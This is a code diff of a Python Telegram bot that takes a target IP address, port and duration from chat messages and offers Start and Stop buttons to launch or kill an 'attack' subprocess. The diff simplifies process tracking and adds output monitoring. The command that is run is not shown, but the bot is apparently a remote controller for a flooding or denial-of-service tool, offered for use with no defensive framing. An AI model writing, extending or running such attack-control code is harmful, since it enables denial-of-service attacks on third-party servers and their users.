@@ -15,46 +15,33 @@ running_processes = {}
 @client.on(events.NewMessage(pattern=r"^(\d+\.\d+\.\d+\.\d+)\s(\d+)\s(\d+)$"))
 async def handle_ip_port(event):
     ip, port, duration = event.pattern_match.groups()
-    msg = await event.respond(
+    await event.respond(
         f"Received IP: {ip}, Port: {port}, Duration: {duration}\nChoose an action:",
         buttons=[
             [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}" )]
         ]
     )
-    # Store the message to update it later
-    running_processes[(event.chat_id, ip, port)] = {'message': msg, 'duration': int(duration)}
 
 @client.on(events.CallbackQuery(pattern=b"(start|stop)\|(\d+\.\d+\.\d+\.\d+)\|(\d+)(?:\|(\d+))?"))
 async def handle_buttons(event):
     action, ip, port, duration = event.pattern_match.groups()
     chat_id = event.chat_id
-    
-    # Decode the bytes if needed and handle empty values properly
-    ip = ip.decode() if isinstance(ip, bytes) else ip
-    port = port.decode() if isinstance(port, bytes) else port
-    duration = int(duration.decode()) if isinstance(duration, bytes) else int(duration)
 
     if action == b"start":
         if (chat_id, ip, port) in running_processes:
             await event.answer("Attack is already running!", alert=True)
             return
 
+        duration = int(duration.decode()) if duration else 60
         await event.answer("Starting the attack...", alert=True)
-        process = await run_attack(chat_id, ip, port, duration)
-
-        # Ensure the message is properly set before attempting to update
-        msg = running_processes[(chat_id, ip, port)]['message']
-        running_processes[(chat_id, ip, port)] = {'process': process, 'message': msg, 'duration': duration}
-        await update_message(msg, ip, port, 'Attack ongoing', duration)
+        process = await run_attack(chat_id, ip.decode(), port.decode(), duration)
+        running_processes[(chat_id, ip, port)] = process
 
     elif action == b"stop":
-        process_info = running_processes.pop((chat_id, ip, port), None)
-        if process_info:
-            process_info['process'].terminate()
+        process = running_processes.pop((chat_id, ip, port), None)
+        if process:
+            process.terminate()
             await event.answer("Attack stopped successfully!", alert=True)
-
-            # Update message to show that the attack is stopped
-            await update_message(process_info['message'], ip, port, 'Attack stopped', 0)
         else:
             await event.answer("No running attack to stop!", alert=True)
 
@@ -66,25 +53,24 @@ async def run_attack(chat_id, ip, port, duration):
             stderr=asyncio.subprocess.PIPE
         )
 
-        # Start a countdown timer for the attack
-        asyncio.create_task(countdown_timer(chat_id, ip, port, duration))
+        # Monitor process in the background
+        asyncio.create_task(monitor_process(chat_id, process))
         return process
     except Exception as e:
         await client.send_message(chat_id, f"Failed to start attack: {e}")
         return None
 
-async def countdown_timer(chat_id, ip, port, duration):
-    for i in range(duration, 0, -1):
-        await asyncio.sleep(1)
-        await update_message(running_processes[(chat_id, ip, port)]['message'], ip, port, 'Attack ongoing', i)
-
-async def update_message(msg, ip, port, status, remaining_time):
-    # Update the original message with the new status and time
-    updated_message = f"{ip}:{port}\nStatus: {status}\nTime remaining: {remaining_time}s" if status == 'Attack ongoing' else f"{ip}:{port}\nStatus: {status}"
+async def monitor_process(chat_id, process):
     try:
-        await msg.edit(updated_message)
+        stdout, stderr = await process.communicate()
+        if stdout:
+            await client.send_message(chat_id, f"Process output: {stdout.decode()}")
+        if stderr:
+            await client.send_message(chat_id, f"Process error: {stderr.decode()}")
     except Exception as e:
-        print(f"Error updating message: {e}")
+        await client.send_message(chat_id, f"Error monitoring process: {e}")
 
 if __name__ == "__main__":
     client.run_until_disconnected()
+
+
